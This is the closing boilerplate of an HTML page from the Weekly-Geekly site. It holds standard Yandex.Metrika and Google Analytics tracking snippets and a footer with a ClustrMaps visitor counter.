<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>